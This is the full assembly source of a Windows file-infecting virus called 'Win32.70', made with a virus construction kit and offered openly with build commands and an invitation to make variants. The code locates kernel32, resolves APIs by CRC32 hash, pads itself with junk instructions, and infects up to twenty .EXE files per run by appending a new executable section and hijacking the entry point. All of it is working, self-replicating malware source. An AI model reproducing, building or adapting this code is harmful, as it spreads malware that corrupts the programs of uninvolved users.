              
;
;
; Win32.70 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.70
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 70
;  Infection Type         : adding a new section 
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 38
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 mov edx, dword ptr [esp]
                                        ; add esp, 4
 dec esp
 add esp, 5d
 sub edx, offset Delta
                                        ; mov ebp, edx
 mov ebp, edx
 jmp KernelSearchStart


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad


                                        ; clear the counter
 mov word ptr [ebp+counter], 0h


 push dword ptr [ebp+NTableVA]
 pop ebx


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], -1
 and dword ptr [ebp+NTableTemp], ebx
 mov ecx, dword ptr [ebp+KernelMZ]
 add ecx, dword ptr [ebx]
                                        ; mov ebx, ecx
                                        ; clear ebx
 mov ebx, 35162d
 sub ebx, 35162d
 add ebx, ecx
                                        ; mov esi, ebx
                                        ; clear esi
 xor esi, esi
 add esi, ebx
 xor dword ptr [ebp+Trash1], 421546     ; Trash
 push esi
 push edi
 cld

                                        ; esi Points to API-Name ( Kernel )
                                        ; edi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 mov ecx, dword ptr [ebp+APICRC32]
 sub ecx, dword ptr [edi]
 or ecx, ecx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop esi
                                        ; clear ebx
 mov ebx, 0
 xor ebx, dword ptr [ebp+NTableTemp]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1
 sbb edx, 10d                           ; Trash

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4h
 add esp, 4h
                                        ; retrieve the offset
                                        ; clear edx
 sub edx, edx
 mov dx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 push edx
 pop eax
                                        ; clear edx
 push 0
 pop edx
 mov dx, word ptr [eax]
 clc
 rcl edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [edx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 mov edx, -64610d
 add edx, 64610d
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov ecx, ebp
 add ecx, offset WFD_szFileName

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov eax, ebp
 add eax, offset WFD_szFileName


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 sub eax, 1
 add eax, 1
 jz NoInfection
                                        ; check for minimum filesize
                                        ; mov ecx, -1
 mov ecx, ( -1d xor 30d )
 xor ecx, 30d
 and ecx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ecx, 20000d
 jbe NoInfection
 add eax, 47934518d                     ; Trash
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov edi, -1
 mov edi, -1d
 and edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
                                        ; mov eax, 19843
 mov eax, 19843d
 cmp eax, 19843d
 je Notagoodfile

Goodfile:
 cmp word ptr [edi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [edi+3Ch]
 pop esi
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],esi
 jb Notagoodfile
 add esi, edi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], '70'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
                                        ; check for OBJ
 mov cx, word ptr [esi+16h]
 and cx, 00002h
 cmp cx, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile
 ror eax, 21d                           ; Trash

NoInfection2:

                                        ; restore the file attributes
                                        ; clear ebx
 mov ebx, -34517d
 add ebx, 34517d
 xor ebx, dword ptr [ebp+Attributes]
 push ebx
 lea eax, [ebp+WFD_szFileName]

 push eax
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

 sub dword ptr [ebp+Trash1], ebx        ; Trash
InfectCurDir:                           ; Infect the current directory
                                        ; mov edi, 20
 mov edi, ( 20d + 18d )
 sub edi, 18d
 mov dword ptr [ebp+InfCounter], edi
 lea ecx, [ebp+filemask]

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 add eax, 1d
 or eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 and edx, 51026358d                     ; Trash
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov eax, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [eax+3Ch]
 add esi, eax
                                        ; get File Alignment
                                        ; add esi, 60
 add esi, 60d
 mov ebx, [esi]
 sub esi, 60d
 mov dword ptr [ebp+filealign], ebx
                                        ; clear esi
 xor esi, esi
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, esi
 add ecx, dword ptr [esi+3Ch]
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], -1
 and dword ptr [ebp+PEheader], ecx
                                        ; get old Entrypoint
 mov ebx, dword ptr [ecx+34h]
 mov dword ptr [ebp+OldBase], ebx
 mov ebx, dword ptr [ecx+28h]
 push ebx
 pop dword ptr [ebp+OldEIP]
 mov edx, [ecx+38h]
 mov dword ptr [ebp+sectionalign], 0
 add dword ptr [ebp+sectionalign], edx
                                        ; Get last section
 mov edx, [ecx+74h]
 shl edx, 3
                                        ; clear ebx
 xor ebx, ebx
 mov bx, word ptr [ecx+6h]
 mov edi, 28h
 pushad
 mov eax, ebx
 mul edi
 mov dword ptr [ebp+Misc1], -1
 and dword ptr [ebp+Misc1], eax
 popad
 mov ebx, dword ptr [ebp+Misc1]
 add ecx, 78h
 add ecx, edx
 add ecx, ebx
 mov eax, ebp
 add eax, offset newsection


 xchg eax, ecx
 push eax
                                        ; Calculate the RVA of the new section
 mov ecx, [eax-5*8+8d]
 add ecx, [eax-5*8+12d]
 mov edx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], edx
 mov dword ptr [ebp+nsphysicalsize], ecx
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], ebx
                                        ;  calculate the virtual size of the new section
 mov edx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], edx
 Call Align
                                        ; clear ecx
 mov ecx, -30629d
 add ecx, 30629d
 add ecx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], 0
 xor dword ptr [ebp+nsvirtualsize], ecx
                                        ; calculate physical offset
 mov ecx,[eax-5*8+20d]
 add ecx,[eax-5*8+16d]
 mov ebx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], ebx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], edx
                                        ; calculate new size
 mov eax, dword ptr [ebp+filealign]
 mov ebx, edx
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], eax
 add ebx, VirusSize
 push ebx
 pop dword ptr [ebp+AlignReg1]
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 push ebx
 pop dword ptr [ebp+NewSize]
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 xor dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
                                        ; mov eax, 64
 mov eax, 0
 add eax, 64d
 mov edx, ebp
 sub dword ptr [ebp+Trash1], ebx        ; Trash
 add edx, offset newsection

 pop ecx
WriteNewSectionLoop:
 mov bl, byte ptr [edx]
 mov byte ptr [ecx], bl
                                        ; add edx, 1
 sub edx, -1d
 dec eax
                                        ; add ecx, 1
 inc ecx
 cmp eax, 0
 jne WriteNewSectionLoop
                                        ; increase section numbers
 mov ecx, dword ptr [ebp+PEheader]
 sub word ptr [ecx+06h], -1
 mov edx, dword ptr [ebp+nsRVA]
 mov dword ptr [ebp+NewEIP], 0
 xor dword ptr [ebp+NewEIP], edx
                                        ; set new EIP
 mov dword ptr  [ecx+28h], edx
                                        ; set infection mark
 mov dword ptr [ecx+4Ch], '70'
 mov ecx, dword ptr [ebp+nsphysicaloffset]
 push ecx
                                        ; Append Virus
 pop edi
 mov esi, ebp
 add esi, offset Virus

 mov eax, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; mov ebx, -1
 mov ebx, ( -1d - 13d )
 add ebx, 13d
 and ebx, dword ptr [ebp+InfCounter]
 add ebx, -1
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 pop edx
 stc
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need

 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ecx
 mov ecx, -22462d
 add ecx, 22462d
 add ecx, [eax+78h]
 add ecx, [ebp+KernelMZ]
                                        ; add ecx, 28
 inc ecx
 add ecx, 27d
 inc dword ptr [ebp+Trash1]             ; Trash
                                        ; get ATableVA
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; add ecx, 4
 add ecx, 4d
                                        ; get NTableVA
 mov eax, dword ptr [ecx]
                                        ; add ecx, 4
 add ecx, 4d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
                                        ; number of API's we're looking for
                                        ; clear edx
 and edx, 0
 add edx, NumberOfApis

                                        ; load API Names and Offsets
 lea eax, [ebp+APINames]
 xchg edi, eax

 lea ecx, [ebp+APIOffsets]


GetApisLoop: 

                                        ; search 'em
                                        ; edi points to the CRC
                                        ; ecx points to the offset

 call SearchAPI1
                                        ; add edi, 4
 add edi, 4d
 mov eax, dword ptr [ebp+TempAPI]
 mov dword ptr [ecx], eax
                                        ; add ecx, 4
 inc ecx
 shl ebx, 23d                           ; Trash
 add ecx, 3d
 dec edx
 jnz GetApisLoop
 jmp Outbreak



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 sub ebx, ebx

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 inc ebx
 push ebx
 mov ebx, 80000000h or 40000000h
 push ebx
 lea edi, [ebp+WFD_szFileName]
 xchg edi, esi
 neg eax                                ; Trash

 push esi
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear edx
 xor edx, edx
 push edx
 push ebx
 push edx
 push 00000004h
 push edx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 test eax, eax
 jz CloseFile
                                        ; clear edx
 and edx, 0
 push ebx
 push edx
 push edx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;                  [ ///// * Data * \\\\\ ]

Data:
newsection:                           ; Settings for the new section
 nsname           db '.JSRBWFG'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 KernelPE    dd 0h
 db 'Win32.70 - SnakeByte',0
 PEheader    dd 0h
 FindHandle  dd 0h
 FileHandle  dd 0h
 InfCounter  dd 0h
 NewEIP      dd 0h
 OTableVA    dd 0h
 filealign   dd 0h
 NTableVA    dd 0h
 sectionalign   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 MapAddress  dd 0h
 Trash1      dd 0h
 NewSize     dd 0h
 counter     dw 0h

 OldEIP      dd 0h
 APICRC32    dd 0h

 APIOffsets:
 XMapViewOfFile         dd 0h
 XFindClose             dd 0h
 XCreateFileMappingA    dd 0h
 XGetFileAttributesA    dd 0h
 XUnmapViewOfFile       dd 0h
 XSetFileAttributesA    dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h

 Misc1       dd 0h
 ATableVA    dd 0h
 AlignReg2   dd 0h
 filemask    db '*.EXE',0

 APINames:
 dd 0797B49ECh           ; MapViewOfFile
 dd 0C200BE21h           ; FindClose
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0C633D3DEh           ; GetFileAttributesA
 dd 094524B42h           ; UnmapViewOfFile
 dd 03C19E536h           ; SetFileAttributesA
 dd 0AA700106h           ; FindNextFileA
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 068624A9Dh           ; CloseHandle
 dd 08C892DDFh           ; CreateFileA

 NTableTemp  dd 0h
 KernelMZ    dd 0h
 Attributes  dd 0h
 MapHandle   dd 0h
 AlignReg1   dd 0h
 OldBase     dd 400000h
 TempAPI     dd 0h




;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov edi, esi
                                        ; clear edi
 push 0
 pop edi
 add edi, esi
                                        ; mov eax, edi
 mov eax, edi
LenCRC:
                                        ; add eax, 1
 add eax, 1d
 cmp byte ptr [eax], 0
 jne LenCRC
 sub eax, edi
                                        ; mov esi, eax
 push eax
 pop esi
                                        ; add esi, 1
 inc esi
 cld
                                        ; clear edx
 push 0
 pop edx
 dec edx
                                        ; mov ecx, edx
 mov ecx, edx
NextByteCRC:
                                        ; clear eax
 mov eax, -58342d
 add eax, 58342d
                                        ; clear ebx
 and ebx, 0
 mov al, byte ptr [edi]
                                        ; add edi, 1
 inc edi
 xor al, dl
 mov dl, dh
 mov dh, cl
 mov cl, ch
 mov ch, 8
NextBitCRC:
 shr bx, 1
 rcr ax, 1
jnc NoCRC
 xor ax,08320h
 xor bx,0EDB8h
NoCRC:
 dec ch
jnz NextBitCRC
 xor edx, eax
 xor ecx, ebx
 dec esi
jnz NextByteCRC
 not ecx
 not edx
 mov eax, ecx
 rol eax, 16d
 mov ax, dx
 mov dword ptr [ebp+APICRC32], eax
 popad
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ebx

                                        ; clear edi
 push 0
 pop edi
 add edi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], edi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 or ebp, ebp
 jz FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 jmp ebx



;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 mov edi, ebp
 add edi, offset WFD_szFileName

                                        ; mov eax, 276
 push 276d
 pop eax

ClearOldData2:
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 inc edi
 dec eax
 jnz ClearOldData2
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea eax, [ebp+WIN32_FIND_DATA]

 push eax
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov ecx, offset WIN32_FIND_DATA
 add ecx, ebp

 push ecx
 mov ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret





;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
                                        ; clear edi
 xor edi, edi
 add edi, dword ptr [ebp+OldEIP]

 push edi
 pop dword ptr [ebp+retEIP]

                                        ; clear esi
 mov esi, 0
 add esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], esi


                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 mov edi, dword ptr [esp]
                                        ; round to pages
 xor di, di
                                        ; add edi, 1
 add edi, 1d
GetKernelLoop:
                                        ; clear ecx
 push 0
 pop ecx
 add edi, -1
 mov cx, word ptr [edi+03ch]
 cmp cx,0f800h
 je GetKernelLoop
 cmp edi, dword ptr [edi+ecx+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], edi
 mov ecx, edi
 add ecx, [edi+3Ch]
 mov [KernelPE+ebp], ecx

 mov edx, ebp
 add edx, offset GetApis

 push edx
ret

CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

